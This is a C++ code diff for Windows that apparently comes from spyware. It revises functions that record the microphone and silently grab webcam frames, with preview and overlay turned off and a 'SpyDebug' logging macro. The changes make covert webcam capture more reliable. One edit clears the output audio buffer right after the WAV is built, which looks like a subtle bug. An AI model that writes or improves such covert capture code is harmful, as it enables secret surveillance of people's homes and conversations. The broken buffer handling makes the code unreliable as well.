@@ -138,7 +138,7 @@ static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav) {
     *(DWORD*)p = dataSize; p += 4;
     memcpy(p, s_AudioData.data(), dataSize);
 
-    s_AudioData.clear();
+    outWav.clear(); // Ensure clean state
     DeleteCriticalSection(&s_AudioLock);
 
     SpyDebug("[Mic] WAV built: %lu bytes (%lu seconds)", fileSize, dwDurationSec);
@@ -163,13 +163,19 @@ static BOOL CaptureWebcamFrame(std::vector<BYTE> &outBmp) {
         return FALSE;
     }
 
-    // Set preview off (don't show anything)
+    // Grab a single frame
     capPreview(hCapWnd, FALSE);
     capOverlay(hCapWnd, FALSE);
 
-    // Grab a single frame
-    Sleep(500); // Give the camera 500ms to warm up
-    capGrabFrame(hCapWnd);
+    // Give the sensor 2 seconds to warm up and adjust exposure
+    Sleep(2000); 
+    
+    if (!capGrabFrame(hCapWnd)) {
+        SpyDebug("[Cam] capGrabFrame failed.");
+        capDriverDisconnect(hCapWnd);
+        DestroyWindow(hCapWnd);
+        return FALSE;
+    }
 
     // Save frame to a temp BMP file (avicap32 limitation)
     char szTempBmp[MAX_PATH];
